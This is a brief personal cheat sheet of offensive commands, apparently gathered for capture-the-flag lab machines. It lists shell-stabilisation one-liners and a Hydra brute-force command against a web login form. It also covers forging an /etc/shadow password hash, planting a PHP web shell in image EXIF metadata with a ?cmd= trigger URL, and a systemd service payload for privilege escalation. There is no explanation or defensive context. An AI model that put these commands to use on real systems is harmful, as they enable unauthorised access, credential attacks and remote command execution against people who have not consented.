


Stabalize Shell Spawn

```
python -c 'import pty; pty.spawn("/bin/bash")'

/usr/bin/script -qc /bin/bash /dev/null


```

# Python Server Start

```
python3 -m http.server --bind 10.17.47.159 9000
```


## HYDRA HTTP-POST FROM BRUTE FORCE


```
hydra -l <Login_Name> -P <wordlist> 10.10.145.133 http-post-form '/admin/:user=^USER^&pass=^PASS^:Username or password invalid'
  
```


## GENERATE PASSWORD HASH FOR /etc/shadow

```
mkpasswd -m sha-512 newpasswordhere
```

  
  

steghide extract -sf Alice-White-Rabbit.jpg

  
  

exiftool -Notes='<?php system($_GET["cmd"]); ?>' a.jpeg

http://victim.machine/uploads/image.php.png?cmd=ls

  
  

echo '[Service] Type=oneshot ExecStart=/bin/sh -c "id > /tmp/output" [Install] WantedBy=multi-user.target' > $TF

  
  
  

rustscan -a owl.thm -- -sC -sV -A -oA yearoftheowl -v --ulimit 10000